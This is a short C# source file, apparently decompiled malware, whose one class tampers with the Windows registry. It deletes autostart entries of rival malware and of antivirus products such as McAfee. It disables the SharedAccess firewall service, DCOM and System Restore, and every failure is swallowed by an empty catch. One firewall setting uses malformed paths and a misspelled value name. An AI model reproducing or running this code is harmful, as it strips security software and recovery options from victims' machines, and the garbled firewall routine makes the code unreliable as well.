using System;
using Microsoft.Win32;

namespace sex;

internal class sex
{
	public void regist2()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		string[] array = new string[26]
		{
			"Taskmon", "Explorer", "Windows Services Host", "KasperskyAV", " d3dupdate.exe", "au.exe", "OLE", "winupd.exe", "direct.exe ", "jijbl ",
			"Video ", "service", "DELETE ME", "d3dupdate.exe", "Sentry", "gouday.exe", "rate.exe", "Windows Services Host", "sysmon.exe ", "srate.exe",
			"ssate.exe ", "Microsoft IE Execute shell", "Winsock2 driver", "ICM version", "yeahdude.exe ", "Microsoft System Checkup"
		};
		string[] array2 = array;
		foreach (string name in array2)
		{
			try
			{
				registryKey.DeleteValue(name);
			}
			catch (Exception)
			{
			}
		}
	}

	public void regist3()
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		string[] array = new string[35]
		{
			"MCAgentExe", "MCUpdateExe", "WinampAgent", "OASClnt", "Taskmon", "Explorer", "Windows Services Host", "KasperskyAV", "System", "msgsvr32",
			"service", "Sentry", "Explorer", "system", "msgsvr32", "au.exe", "winupd.exe", "direct.exe ", "jijbl ", "Video ",
			"service", "DELETE ME", "d3dupdate.exe", "Sentry", "gouday.exe", "rate.exe", "Windows Services Host", "sysmon.exe ", "srate.exe", "ssate.exe ",
			"Microsoft IE Execute shell", "Winsock2 driver", "ICM version", "yeahdude.exe ", "Microsoft System Checkup"
		};
		string[] array2 = array;
		foreach (string name in array2)
		{
			try
			{
				registryKey.DeleteValue(name);
			}
			catch (Exception)
			{
			}
		}
	}

	public void setreg()
	{
		try
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess", "Start", "4", RegistryValueKind.DWord);
		}
		catch (Exception)
		{
		}
	}

	public void setreg7()
	{
		try
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\\\ControlSet001\\\\Services\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\StandardProfile", "EnableFirewal", "1", RegistryValueKind.DWord);
		}
		catch (Exception)
		{
		}
	}

	public void setreg8()
	{
		try
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\\\Microsoft\\\\OLE", "EnableDCOM", "N", RegistryValueKind.String);
		}
		catch (Exception)
		{
		}
	}

	public void setreg9()
	{
		try
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SystemRestore", "DisableSR", "1", RegistryValueKind.DWord);
		}
		catch (Exception)
		{
		}
	}
}
